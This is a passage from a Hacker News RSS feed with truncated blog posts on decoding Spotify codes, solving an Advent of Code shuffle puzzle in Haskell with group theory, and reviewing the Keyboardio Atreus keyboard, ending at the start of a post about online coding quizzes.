</code></pre></div><p>There are a few steps required to turn a media reference into a Spotify code (and vis versa).</p><h3 id="cyclic-redundancy-check">Cyclic Redundancy Check</h3><p>A <a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check">Cyclic redundancy check</a> is calculated for the media ref. Based on the fact that 8 bits are calculated, I am assuming Spotify uses CRC8.</p><div><pre><code data-lang="python"><span>import</span> crc8

hash <span>=</span> crc8<span>.</span>crc8()
media_ref <span>=</span> <span>67775490487</span>
ref_bytes <span>=</span> media_ref<span>.</span>to_bytes(<span>5</span>, byteorder<span>=</span><span>"big"</span>)
<span>print</span>(ref_bytes)
<span># b'\x0f\xc7\xbb\xe9\xb7'</span>
hash<span>.</span>update(ref_bytes)
check_bits <span>=</span> hash<span>.</span>digest()
<span>print</span>(check_bits)
<span># b'\x0c'</span>
</code></pre></div><p>Append the crc to the media reference:</p><div><pre><code data-lang="python">media_reference <span>=</span> <span>b</span><span>'</span><span>\x0f\xc7\xbb\xe9\xb7\x0c</span><span>'</span>
</code></pre></div><h3 id="forward-error-correction">Forward error correction</h3><p>Next <a href="https://en.wikipedia.org/wiki/Error_correction_code#Forward_error_correction">forward error correction</a> (FEC) is used to add some <strong>redundancy</strong> to the code. This makes the decoding process more reliable. Decoding Spotify codes involves going from analog (bar lengths) to digital (media reference), so it is a good candidate for this error correction.</p><blockquote><p>The fundamental principle of [error correction] is to add redundant bits in order to help the decoder to find out the true message that was encoded by the transmitter.</p></blockquote><p>A simple example of error correction would be to replicate each bit twice. So instead of sending <code>1</code>, you would send <code>111</code>. When that triplet is sent across a â€œnoisyâ€ communication channel, some of the bits could get flipped. But since there are 2 redundant bits, the receiver can guess what the value was meant to be:</p><table><thead><tr><th>Triplet received</th><th>Interpreted as</th></tr></thead><tbody><tr><td>000</td><td>0 (error-free)</td></tr><tr><td>001</td><td>0</td></tr><tr><td>010</td><td>0</td></tr><tr><td>100</td><td>0</td></tr><tr><td>111</td><td>1 (error-free)</td></tr><tr><td>110</td><td>1</td></tr><tr><td>101</td><td>1</td></tr><tr><td>011</td><td>1</td></tr></tbody></table><p>The patents donâ€™t specify what forward error correction schema Spotify uses, but they do say that they add 15 bits at this step. The code rate of an error correction scheme is the ratio of the information bits to the total encoded bit length. Spotify adds 15 bits to the 45 bit code, so the code rate is <code>45 / 60 = 0.75</code>. This code rate is high (close to 1) meaning it is fairly weak. It facilitates a limited amount of error correction, but that is okay. If you are sending a message to a deep space probe you want a very strong code. A Spotify code is pretty low risk: itâ€™s easy to ping the server a few times if you decode the wrong media reference.</p><p>The total forward error corrected code is 60 bits long, which is the exact amount of information that can be encoded in the 20 octals (bar heights) in the Spotify barcode!</p><p>The patents do mention that Spotify uses the <a href="https://en.wikipedia.org/wiki/Viterbi_decoder">Viterbi algorithm</a> to decode the media reference from the forward error corrected code. I wonâ€™t go into it here, but that algorithm uses the redundant bits from the forward error correction to determine the best guess of the actual media reference.</p><h3 id="gray-code">Gray Code</h3><p>I really like this part of the Spotify codes.</p><p><a href="https://en.wikipedia.org/wiki/Gray_code">Gray code</a> is an alternative way to represent a binary number. If you look closely at the following table, you will see that Gray code works by changing only one bit at a time.</p><table><thead><tr><th>Decimal</th><th>Binary</th><th>Gray</th></tr></thead><tbody><tr><td>0</td><td>000</td><td>000</td></tr><tr><td>1</td><td>001</td><td>001</td></tr><tr><td>2</td><td>010</td><td>011</td></tr><tr><td>3</td><td>011</td><td>010</td></tr><tr><td>4</td><td>100</td><td>110</td></tr><tr><td>5</td><td>101</td><td>111</td></tr><tr><td>6</td><td>110</td><td>101</td></tr><tr><td>7</td><td>111</td><td>100</td></tr></tbody></table><p>Why does Spotify use Gray code? What is wrong with normal binary representation of the code?</p><p>The difference between 3 and 4 in Gray code is only 1 bit (<code>010 -&gt; 110</code>). In normal binary representation, that difference is 3 bits (<code>100 -&gt; 011</code>). When going from analog (the height of a given bar) to binary, using Gray codes reduces the number of bits that are â€œwrongâ€ if we calculate the wrong height.</p><p>If the height of a bar is supposed to be 3, but we calculate that it is 3.51 and we round up to 4, the binary representation of that number in Gray code will only be off by one bit. <strong>This makes the forward error â€¦</strong></p></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://boonepeter.github.io/posts/2020-11-10-spotify-codes/">https://boonepeter.github.io/posts/2020-11-10-spotify-codes/</a></em></p>]]>
            </description>
            <link>https://boonepeter.github.io/posts/2020-11-10-spotify-codes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151100</guid>
            <pubDate>Thu, 19 Nov 2020 16:29:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Shuffling Things Up: Solving Advent of Code with Group Theory and Haskell]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25151050">thread link</a>) | @jle
<br/>
November 19, 2020 | https://blog.jle.im/entry/shuffling-things-up.html | <a href="https://web.archive.org/web/*/https://blog.jle.im/entry/shuffling-things-up.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>So itâ€™s November, and <a href="https://adventofcode.com/">Advent of Code</a> season is in the air! Itâ€™s time for everyoneâ€™s favorite Santa-based light hearted learn-to-program-or-a-new-language holiday season programming challenge series. Every year a bunch of us gather around the fireplace, roast chestnuts, and brainstorm all of the interesting ways we can solve these cute themed puzzles every day. These puzzles are designed to accessible enough for most new programmers, but deep enough to provide entertainment for experienced ones. Iâ€™ve <a href="https://blog.jle.im/entries/tagged/advent-of-code.html">written many blog posts</a> on some of the interesting insight some of the puzzles have yielded, and I also <a href="https://github.com/mstksg/advent-of-code-2019/blob/master/reflections.md">post my reflections on as many puzzles I can</a> while solving them in Haskell. And if youâ€™re solving things in Haskell, I also published an <a href="https://hackage.haskell.org/package/advent-of-code-api">open-sourced rate-limited API library</a> so you can fetch and submit answers from the comfort of your command line.</p>
<p>To kick off the season, Iâ€™ve decided to write about one of my favorite puzzles from Advent of Code 2019 â€“ <a href="https://adventofcode.com/2019/day/22">Day 22: Slam Shuffle</a>. To me, it stands out because itâ€™s a perfect example of how Haskellâ€™s approach to mathematical abstraction nudges you into the direction of an efficient solution â€” in a way that other languages would obscure or make less obvious.</p>
<p>So, letâ€™s dive in! In the end, hopefully this post can get you excited for this wonderful season, and maybe also shed some insight into what it means when we say that Haskell can help you leverage math to find good solutions to your real problems.</p>
<p>Of course, this post has spoilers for Advent of Code 2019 Day 22, if you are planning on trying to figure it out from yourself. If you havenâ€™t tried it, I recommend you give it a shot and come back after! :D</p>
<h2 id="slam-shuffle">Slam Shuffle</h2>
<p>If you havenâ€™t already, take some time to <a href="https://adventofcode.com/2019/day/22">read through the problem statement</a>. The basic idea is that we are given a series of operations to â€œshuffleâ€ a deck of 10007 cards, such as:</p>
<pre><code>deal with increment 7
deal into new stack
deal into new stack
... etc</code></pre>
<p>After performing all of the many operations, the question then asks about the card at a given position (the 2019th card in the deck).</p>
<p>Part 2, which you might not be able to see if you havenâ€™t submitted an answer yet for Part 1, involves the same process with a deck of 119315717514047 cards, and repeating the entire shuffling sequence 101741582076661 times. It then asks you to find the card that ends up at index 2020.</p>
<p>In this problem, it seems we have a list of â€œshufflesâ€ that we want to run on a deck of cards. However, letâ€™s think about this in a more data-driven approach: instead of thinking about successive shufflings of cards, letâ€™s imagine the specification of a â€œshuffleâ€ itself as our main data, and how we can combine shuffle operations together into new shuffle operations.</p>
<p>We are looking for â€œtake shuffle A and shuffle B, and return a new shuffle that represents doing B, then Aâ€. This is â€œshuffle compositionâ€, or â€œpermutation compositionâ€ (<a href="https://en.wikipedia.org/wiki/Permutation">permutation</a> being the mathematical word for â€œshufflingâ€ here, basically)</p>
<p>Since weâ€™ve identified that we want to begin implementing a way of composing/combining permutations together, we can do a bit of reading to learn that one of the most famous properties of permutation composition is that they form a â€œgroupâ€, which means they can be composed (associatively), have an identity, and can be inverted. This means that if you have two permutations, you can â€œsquishâ€ them to create a new permutation, and work with that <em>new</em> permutation.</p>
<p>Iâ€™ve talked about <a href="https://blog.jle.im/entry/alchemical-groups.html">using group theory</a> principles before in this blog to help guide us towards solutions and optimizations â€” the main principle is that if we express our program in terms of group operations, then we can take advantage of the large body of knowledge built up over centuries to understand, analyze, and potentially optimize our program.</p>
<p>The <em>first</em> big advantage in this situation is that we can treat our transformations <em>as data</em>, and not as functions. And that if we have two transformations, we can always create a new one (just a normal data type value) that represents the composition of the two original ones.</p>
<h2 id="now-youre-thinking-with-groups">Now Youâ€™re Thinking With Groups</h2>
<p>Knowing permutations are a group, it means that once we settle on our representation of them, <code>Perm</code>, we can write an instance of <code>Perm</code> for <code>Semigroup</code>, <code>Monoid</code>, and <code>Group</code>, abstractions in Haskell that many types are already instances of. Abstractions like <code>Semigroup</code> and <code>Monoid</code> are pretty much an everyday thing in Haskell, so this fits in quite nicely. <code>Group</code> comes from the <em><a href="https://hackage.haskell.org/package/groups">groups</a></em> package, which also provides some nice applications of group theory.</p>
<div id="cb2"><pre><code><span id="cb2-1"><a href="#cb2-1"></a><span>data</span> <span>Perm</span> n <span>=</span> <span>...</span> <span>-- let's figure out the implementation later, where n is the number of cards</span></span></code></pre></div>
<p>In Haskell, we express things like â€œ<code>Perm</code> is a Semigroup/Monoid/Groupâ€ by saying that they are instances of <em>typeclasses</em>, which (for this purpose) are like interfaces in languages like Java.</p>
<div id="cb3"><pre><code><span id="cb3-1"><a href="#cb3-1"></a><span>-- | An instance m can be "combined" using `x &lt;&gt; y`</span></span>
<span id="cb3-2"><a href="#cb3-2"></a><span>class</span> <span>Semigroup</span> m <span>where</span></span>
<span id="cb3-3"><a href="#cb3-3"></a><span>    (&lt;&gt;) ::</span> m <span>-&gt;</span> m <span>-&gt;</span> m</span>
<span id="cb3-4"><a href="#cb3-4"></a></span>
<span id="cb3-5"><a href="#cb3-5"></a><span>-- | There is always an identity element for &lt;&gt;:</span></span>
<span id="cb3-6"><a href="#cb3-6"></a><span>--</span></span>
<span id="cb3-7"><a href="#cb3-7"></a><span>-- x &lt;&gt; mempty == x</span></span>
<span id="cb3-8"><a href="#cb3-8"></a><span>-- mempty &lt;&gt; x == x</span></span>
<span id="cb3-9"><a href="#cb3-9"></a><span>--</span></span>
<span id="cb3-10"><a href="#cb3-10"></a><span>class</span> <span>Semigroup</span> m <span>=&gt;</span> <span>Monoid</span> m <span>where</span></span>
<span id="cb3-11"><a href="#cb3-11"></a><span>    mempty ::</span> m</span>
<span id="cb3-12"><a href="#cb3-12"></a></span>
<span id="cb3-13"><a href="#cb3-13"></a><span>-- | Every m has an inverse:</span></span>
<span id="cb3-14"><a href="#cb3-14"></a><span>--</span></span>
<span id="cb3-15"><a href="#cb3-15"></a><span>-- x &lt;&gt; invert x == mempty</span></span>
<span id="cb3-16"><a href="#cb3-16"></a><span>-- invert x &lt;&gt; x == mempty</span></span>
<span id="cb3-17"><a href="#cb3-17"></a><span>--</span></span>
<span id="cb3-18"><a href="#cb3-18"></a><span>class</span> <span>Monoid</span> m <span>=&gt;</span> <span>Group</span> m <span>where</span></span>
<span id="cb3-19"><a href="#cb3-19"></a><span>    invert ::</span> m <span>-&gt;</span> m</span></code></pre></div>
<p>This means that if <code>Perm</code> is an instance of <code>Group</code> (which has superclasses <code>Semigroup</code> and <code>Monoid</code>), we can:</p>
<ul>
<li>Compose permutations using <code>x &lt;&gt; y</code>, which means â€œshuffle with strategy <code>y</code>, then with strategy <code>x</code>â€</li>
<li>Summon an â€œidentity permutationâ€ where <code>x &lt;&gt; mempty == x</code> (the identity permutation, which is â€œleave things aloneâ€).</li>
<li>Invert any shuffling (if we have <code>x</code>, we can reverse its effect with <code>invert x</code>)</li>
</ul>
<p>In addition, the standard libraries also give us a useful function <code>stimes</code></p>
<div id="cb4"><pre><code><span id="cb4-1"><a href="#cb4-1"></a><span>stimes ::</span> <span>Semigroup</span> m <span>=&gt;</span> <span>Int</span> <span>-&gt;</span> m <span>-&gt;</span> m</span></code></pre></div>
<p>which lets us compose <code>x</code> with itself (<code>stimes 5 x == x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x</code>), but can do it in <em>log(n)</em> time using <a href="https://en.wikipedia.org/wiki/Exponentiation_by_squaring">repeated squaring</a>. Itâ€™s extremely efficient in a lot of circumstances (more on that later) â€” more so than the naive compose-it-n-times implementation. This will definitely become useful in part 2, where we have to do 101741582076661 compositions.</p>
<h2 id="our-gameplan">Our Gameplan</h2>
<p>Just <em>knowing</em> that permutations form a group naturally guides us to these abstractions â€” we already know what <em>interface</em> our type will have, even before we write any code. We know that no matter <em>what</em> our implementation of permutation will be, we will have <code>(&lt;&gt;)</code>, <code>stimes</code>, <code>mempty</code>, <code>invert</code> available to us to use. So, letâ€™s do just that! Weâ€™ll use a stub data type <code>Perm</code> to represent our permutation and â€œpretendâ€ we have that interface on it. Weâ€™ll write our functions first and then fill in the interface later!</p>
<div id="cb5"><pre><code><span id="cb5-1"><a href="#cb5-1"></a><span>-- | Represents a permutation of n cards</span></span>
<span id="cb5-2"><a href="#cb5-2"></a><span>data</span> <span>Perm</span> n <span>=</span> <span>....</span></span>
<span id="cb5-3"><a href="#cb5-3"></a></span>
<span id="cb5-4"><a href="#cb5-4"></a><span>-- | Given a permutation, find the place where a given index ends up.</span></span>
<span id="cb5-5"><a href="#cb5-5"></a><span>runPerm ::</span> <span>Perm</span> n <span>-&gt;</span> <span>Finite</span> n <span>-&gt;</span> <span>Finite</span> n</span>
<span id="cb5-6"><a href="#cb5-6"></a></span>
<span id="cb5-7"><a href="#cb5-7"></a><span>-- | Parse a string line into the permutation it represents</span></span>
<span id="cb5-8"><a href="#cb5-8"></a><span>parsePerm ::</span> <span>String</span> <span>-&gt;</span> <span>Perm</span> n</span>
<span id="cb5-9"><a href="#cb5-9"></a></span>
<span id="cb5-10"><a href="#cb5-10"></a><span>-- | Given a permutation list, find the place where 2019 ends up</span></span>
<span id="cb5-11"><a href="#cb5-11"></a><span>part1 ::</span> [<span>Perm</span> <span>10007</span>] <span>-&gt;</span> <span>Finite</span> <span>10007</span></span>
<span id="cb5-12"><a href="#cb5-12"></a>part1 perms <span>=</span> runPerm bigPerm <span>2019</span></span>
<span id="cb5-13"><a href="#cb5-13"></a>  <span>where</span></span>
<span id="cb5-14"><a href="#cb5-14"></a>    bigPerm <span>=</span> <span>mconcat</span> perms</span></code></pre></div>
<p>(<code>mconcat perms</code> composes all of the permutations one after another: <code>mconcat [x,y,z] = x &lt;&gt; y &lt;&gt; z</code>)</p>
<p>Andâ€¦thatâ€™s it! For the actual â€œlogicâ€ of our part 1! All we need to do is implement <code>runPerm</code> and <code>parsePerm</code>.</p>
<p>Here, Iâ€™m using <code>Finite n</code> from the great <em><a href="https://hackage.haskell.org/package/finite-typelits">finite-typelits</a></em> library, where <code>Finite 100</code> represents â€œan index between 0 and 99â€, etc. Itâ€™s just exactly the right â€œshapeâ€ to represent the index of a deck of cards. <em>finite-typelits</em> wasnâ€™t designed with group theory in mind, but itâ€™s still a great tool here â€” which is a testament to how flexible these abstractions can actually be :)</p>
<p>For example, it means that for a <code>Perm 10007</code> (a permutation of 10007 cards), the type of <code>runPerm</code> is <code>Perm 10007 -&gt; Finite 10007 -&gt; Finite 10007</code>, and the type of <code>parsePerm</code> is <code>String -&gt; Perm 10007</code>.</p>
<p>We can plan out our part 2 as well:</p>
<div id="cb6"><pre><code><span id="cb6-1"><a href="#cb6-1"></a><span>-- | Given a permutation list, find the index that will end up at 2020</span></span>
<span id="cb6-2"><a href="#cb6-2"></a><span>part2 ::</span> [<span>Perm</span> <span>119315717514047</span>] <span>-&gt;</span> <span>Finite</span> <span>119315717514047</span></span>
<span id="cb6-3"><a href="#cb6-3"></a>part2 perms <span>=</span> runPerm (invert biiigPerm) <span>2020</span></span>
<span id="cb6-4"><a href="#cb6-4"></a>  <span>where</span></span>
<span id="cb6-5"><a href="#cb6-5"></a>    bigPerm   <span>=</span> <span>mconcat</span> perms</span>
<span id="cb6-6"><a href="#cb6-6"></a>    biiigPerm <span>=</span> stimes <span>101741582076661</span> bigPerm</span></code></pre></div>
<p>Part 2, I think, is where the group theory really shines.</p>
<ol type="1">
<li><p>We take advantage of <code>stimes</code>, which uses <a href="https://en.wikipedia.org/wiki/Exponentiation_by_squaring">repeated squaring</a>. That means that to compute <code>stimes 8 x</code>, instead of using</p>
<pre><code>x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x</code></pre>
<p>it does</p>
<pre><code>let x2 = x &lt;&gt; x
    x4 = x2 &lt;&gt; x2
in  x4 &lt;&gt; x4</code></pre>
<p>essentially cutting down the number of multiplications exponentially. This means that to compute <code>stimes 101741582076661</code>, we only need to do about 47 multiplications (log base 2), and not 101741582076661.</p>
<p>This is only possible because we know that permutation composition is associative, so it doesnâ€™t matter how we associate our parentheses. It is only â€œsafeâ€ to use repeated squaring if you <em>know</em> that your operation is associative. Having a semigroup abstraction <em>in the first place</em> guides us to this efficient solution â€” in a way that is pre-built just for us! This is made all the more powerful because <em>semigroup</em> is a ubiquitous abstraction in Haskell, so we â€œthink aboutâ€ it all the time.</p></li>
<li><p>Remember how <code>runPerm p 2019</code> gives us the index that <code>2019</code> is sent to? Well, we want something else in this case. We basically want the index that <em>will be sent to</em> <code>2020</code>. So, we want to <em>reverse the function</em>. Luckily, since our function is just a permutation, it is easy to reverse this: just <code>invert</code> the permutation!</p>
<p>The idea that we can simply invert a permutation instead of having to write a whole new permutation representation just to do â€œbackwards indexingâ€ is something that we are <em>guided to</em>, just by recognizing that permutations form a group.</p></li>
</ol>
<h2 id="a-first-guess-at-implementation">A first guess at implementation</h2>
<p>Now, time to do what we have been putting off and actually write our permutation representation â€“ the definition of <code>Perm n</code>. A good <em>first guess</em> might be to write our permutation as an actual function â€” a function from index to index, <code>Finite n -&gt; Finite n</code>. Then, we can just use function composition as our permutation composition.</p>
<div id="cb9"><pre><code><span id="cb9-1"><a href="#cb9-1"></a><span>data</span> <span>Perm</span> n <span>=</span> <span>Perm</span> (<span>Finite</span> n <span>-&gt;</span> <span>Finitâ€¦</span></span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.jle.im/entry/shuffling-things-up.html">https://blog.jle.im/entry/shuffling-things-up.html</a></em></p>]]>
            </description>
            <link>https://blog.jle.im/entry/shuffling-things-up.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151050</guid>
            <pubDate>Thu, 19 Nov 2020 16:25:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Open Source Keyboardio Atreus Keyboard â€“ Six Week Review]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25150868">thread link</a>) | @codesections
<br/>
November 19, 2020 | https://www.codesections.com/blog/atreus-review/ | <a href="https://web.archive.org/web/*/https://www.codesections.com/blog/atreus-review/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  
    

  <h2>Open Source Keyboardio Atreus Keyboard â€“ Six Week Review</h2>
  <p>As I write this, I've now had my Keyboardio Atreus for a full six weeks and have been
using it pretty much exclusively that whole time.  After a month and a half, I've given it
a fair shake and can give you my full impressions.  And my full impression is that it is
<strong>amazing</strong>.</p>

<h2 id="atreus-background">Atreus background</h2>
<p>Before I tell you what I love about it, what <em>is</em> the Atreus?  Well, it's a keyboard. It's
a <em>tiny</em> keyboard.</p>
<p>More specifically, it's a keyboard with 44 keys â€“ compared with 84 on my ThinkPad
keyboard, and a full 108 on a traditional desktop keyboard.  How does it get by with so
few keys?  More on that in a minute; for now, just focus on how small the thing is,
without needing to cramp any of the individual keys in the least.</p>
<p><img src="https://www.codesections.com/blog/atreus-review/atreus.jpeg" alt="The Atreus keyboard on top of a ThinkPad"></p>
<span id="continue-reading"></span>
<p>Just from that photo, you might notice a few other features of the Atreus.  First â€“ and
unlike nearly every other keyboard in existence â€“ its keys are arranged into columns
rather than rows: the <code>D</code> is exactly even with the <code>E</code> key above it, but isn't vertically
aligned with the <code>F</code> key to its right.  Both of these changes make the Atreus <em>far</em> more
ergonomic to use.  Aligning the keys horizontally means that your fingers don't need move
diagonally nearly as often (a big contributor to RSI).  And moving the keys out of
horizontal rows aligns them more comfortably with the lengths of your fingers.  This
ortholinear layout is designed to make the Atreus significantly more comfortable and, more
importantly, to reduce the strain inherent in typing.</p>
<p>The other feature you likely noticed from the image is that my Atreus doesn't have any
letters on the keys.  That's not a requirement â€“ they also offer the Atreus with keycaps
made out of "bright white PBT, which is dye-sublimated black and then laser-ablated to
reveal bright white legends".  As fancy as that sounds, I opted for the blank keycaps
because it helps with the Atreus's <em>other</em> superpower.</p>
<p>Aside from its compact and ergonomic form factor, the Atreus's standout feature is its
full and easy customization.  You can set exactly what you want to happen on every key
press, whether that's sending a single key or executing a complex series of commands.  And
all of this happens at the firmware level on the keyboard â€“ which means it Just Worksâ„¢ on
any computer you might plug the Atreus into, without any software.</p>

<p>The Atreus actually offers two ways to customize the keys: A GUI configuration tool called
Chrysalis (shown below) and text-based configuration via Kaleidoscope. </p>
<p><img src="https://www.codesections.com/blog/atreus-review/chrysalis.png" alt="Chrysalis screenshot with default QWERTY layout"></p>
<p>And all of this is powered by fully open source code.  The Atreus <a href="https://atreus.technomancy.us/">began
life</a> as a DIY project by the noted Free Software hacker
and language designer Phil Hagelberg (aka <a href="https://atreus.technomancy.us/">technomancy</a>),
and is now manufactured by Keyboardio; between the two of them, they've maintained an
admirable commitment to building the Atreus on free software.</p>
<p>So, now you know what the Atreus is: it's tiny, it's customizable, and it's fully powered
by free software.  But what's it like to actually <em>use</em> the thing?</p>
<h2 id="how-does-it-all-fit">How does it all fit?</h2>
<p>Let's talk about the point I put off above: just how do you use a keyboard that
only has 44 keys?  Even if we're only typing English ASCII text, we need to be able to
type 26 letters, 10 numerals, and 30 special characters.  Simple arithmetic is enough to
show that those 66 letters won't fit into 44 keys in a straightforward way â€“ and that's
without considering non-printing characters or modifiers.</p>
<p>But it's actually modifiers that make the Atreus possible.  A typical keyboard has four
(or more) modifiers: Ctrl, Alt, Left Shift, and Right Shift.  Many keyboards will have
more than one Ctrl key, but they'll <em>all</em> have two Shift keys.  Why?  Well, as anyone who
has ever learned to touch type can tell you, there are two Shift keys so that you can hold
one with your right pinky when you type keys on the left side of the keyboard and can
hold the other with your left pinky whenever you type keys on the right side of the
keyboard.  If we only had one shift key to hit with our pinky, we'd have to contort our
hand mightily to enter capital letters on that side of the keyboard.</p>
<p>But we're only in that bind because we're forced to use our pinkies to hit the Shift
keys.  The Atreus moves that duty away from our weakest finger and to our strongest finger
â€“ a finger that, incidentally, is ridiculously underused in a traditional keyboard
layout.  With the Atreus, you press the Shift key with your left thumb.  That means you
can press shift without moving your fingers out of position on the home row; moreover, in
combination with the Atreus's smaller number of keys, it means you can comfortably hold
the left shift key while pressing any other key on the keyboard.</p>
<p>That may not sound like a huge win â€“ if all it does for us is get rid of the right Shift
key, then it just saves the Atreus a single key.  However, because the Atreus is
symmetrical, everything we just said about the left Shift key is equally true of the right
Shift key: you can also hold it while comfortably pressing every key on the keyboard.
Except we just said that we don't need a right Shift key.</p>
<p>Or, at least, we don't need a right Shift key that shifts us into typing capital letters.
Instead, we can use the right "Shift" key to shift us into a different set of characters
altogether.  This might sound a bit odd (and I acknowledge that it takes some getting used
to) but it's not really that different from how the Shift key works on a normal keyboard.
On a normal keyboard, you enter the <code>?</code> character by pressing <code>Shift</code> and <code>/</code> at the same
time; that's not because a question mark is somehow a "capital slash" (which, anyway,
sounds more like something a corporate raider would do than an item of punctuation).
Shifting into the other set of characters â€“ the Atreus calls them Layer 2 â€“ works just
like that, but for everything. </p>
<p><img src="https://www.codesections.com/blog/atreus-review/layer.png" alt="Layer 2 keys with default bindings"></p>
<p>That gives us up to an extra 43 effective keys to play with (since we're holding one key
down, we can't assign a new value to it), which would put us at 87 keys â€“ already more
than my ThinkPad keyboard.  In practice, however, you probably don't want to assign a
different character for <em>every</em> key; the default bindings leave 8 with their Layer 1
meanings, which leaves us with just 79 effective keys.  So we're still short of a laptop
keyboard, to say nothing of a traditional desktop one.</p>
<p>Talking about Layer 1 and Layer 2 has probably made the solution to this obvious: add a
Layer 3!  And that's exactly what the default bindings do, adding another 25 keys, which
brings us up to 104 effective keys and parity with a full desktop keyboard.</p>
<p>But how do we access Layer 3?  We could dedicate another thumb key to it (which is what I
do in my personal configuration), but the default bindings go a different direction:
instead of accessing the layer by holding a key, you toggle into it by pressing a key
(i.e., instead of being like Shift, it's like CapsLock).</p>
<h2 id="ok-but-why">Ok, but why?!</h2>
<p>At this point, you probably get the <em>how</em> behind the Atreus's method for fitting 100+ keys
worth of functionality into just 44 keys.  But I wouldn't blame you if you're fuzzy on the
<em>why</em>.  Why go through all that trouble (and the learning curve of at least slightly
retraining your fingers) just to get back to the same number of keys that we started with?</p>
<p>Well, for some people, part of the appeal might be portability; Keyboardio even offers a
<a href="https://shop.keyboard.io/products/keyboardio-atreus-travel-case">travel case</a>.  It could
be the perfect keyboard to take with you when you work from a coffee shop, co-working
space, or other crowded public space!</p>

<p>The Atreus really was first designed as an ergonomic keyboard that <a href="https://technomancy.us/172">you can take to local
coffee shops</a>.  But, even when coffee-shop-working was an
option, I was never interested in the Atreus for that sort of portability.  I like the
idea of a small keyboard for three reasons: ergonomics, consistency, and speed.</p>
<h3 id="ergonomics">Ergonomics</h3>
<p>A big part of the reason I started looking at switching to a non-laptop keyboard is that
I'd started to experience a bit of discomfort after long stretches of coding.  Nothing
bad; nothing I'd even call pain.  But something noticeable, and I'm inclined to take even
a <em>hint</em> of Repetitive Strain Injury very seriously â€“ especially given how many <a href="http://ergoemacs.org/emacs/emacs_hand_pain_celebrity.html">
programmers</a> have <a href="https://medium.com/@mdlayher/a-programmers-journey-with-rsi-c73628eed0c4">dealt with
RSI</a>.  And,
while there's a lot of disagreement about RSI, nearly everyone agrees that prevention is
far, far easier than cure.</p>
<p>If you take a look at <a href="http://xahlee.info/kbd/ergonomic_keyboards.html">lists</a> of <a href="https://www.nytimes.com/wirecutter/reviews/comfortable-ergo-keyboard/">best
ergonomic
keyboards</a>, you
probably won't see the Atreus. Partly, that's because it's new, and a bit less mainstream;
it might not be on everyone's radar.  But even accounting for that, the Atreus is missing
at least a few features that the most ergonomic keyboard have â€“ though it does have most
of them.  Here, have a chart comparing the Atreus, the
<a href="https://ergodox-ez.com/">Ergodox-EZ</a>, and the
<a href="https://github.com/adereth/dactyl-keyboard">Dactyl</a>.</p>
<table><thead><tr><th>Feature</th><th>Ergodox</th><th>Dactyl</th><th>Atreus</th></tr></thead><tbody>
<tr><td>Mechanical keys</td><td>âœ“</td><td>âœ“</td><td>âœ“</td></tr>
<tr><td>Split section for hands</td><td>âœ“</td><td>âœ“</td><td>âœ“</td></tr>
<tr><td>Ortholinear layout</td><td>âœ“</td><td>âœ“</td><td>âœ“</td></tr>
<tr><td>Fully split halves</td><td>âœ“</td><td>âœ“</td><td>âœ—</td></tr>
<tr><td>Elevated middle ("tenting")</td><td>âœ“</td><td>âœ“</td><td>âœ—</td></tr>
<tr><td>Concave keys</td><td>âœ—</td><td>âœ“</td><td>âœ—</td></tr>
</tbody></table>
<p>So, given the Atreus's strong but definitely trailing showing on those traditional
ergonomic factors, why am I still enthusiastic about the Atreus as an ergonomic keyboard?</p>
<p>Well, it comes down to what each finger is being asked to do â€“ or, put differently, it
comes right back to how tiny the Atreus is.  If you look at the <a href="https://ergodox-ez.com/pages/getting-started">default layout of the
Ergodox-EZ</a>, you'll see that each pinky
is responsible for <strong>ten</strong> keys, many of which involve the more-ergonomically harmful
diagonal movement.  Two keys (in the default layout, <code>=</code> and <code>-</code>) require stretching your
pinky two keys up and one to the side â€“ at least for me, that'd be quite the stretch.  In
contrast, the Atreus asks your pinky to be responsible for only four keys, none of which
involve diagonal movement, and only one of which is more than one key away.</p>
<p>I know I'm harping on the pinkies a bit but, well, there's a reason some people call RSI
<a href="https://skeptics.stackexchange.com/questions/17492/does-emacs-cause-emacs-pinky">Emacs
Pinky</a>.
The pinky is, obviously, one of the weakest fingers, and asking it to do a lot is a fast
way to overtax your hands.  And some of those big stretches can be even more â€¦</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.codesections.com/blog/atreus-review/">https://www.codesections.com/blog/atreus-review/</a></em></p>]]>
            </description>
            <link>https://www.codesections.com/blog/atreus-review/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150868</guid>
            <pubDate>Thu, 19 Nov 2020 16:08:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sorry, I wonâ€™t take your online coding quiz]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25150836">thread link</a>) | @Ahmedb
<br/>
November 19, 2020 | https://ahbou.org/post/635229336295899136/sorry-i-wont-take-your-online-coding-quiz | <a href="https://web.archive.org/web/*/https://ahbou.org/post/635229336295899136/sorry-i-wont-take-your-online-coding-quiz">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<section>
				

				

				
					<article>
						
							
								<a href="https://ahbou.org/post/635229336295899136/sorry-i-wont-take-your-online-coding-quiz"></a>
							
							
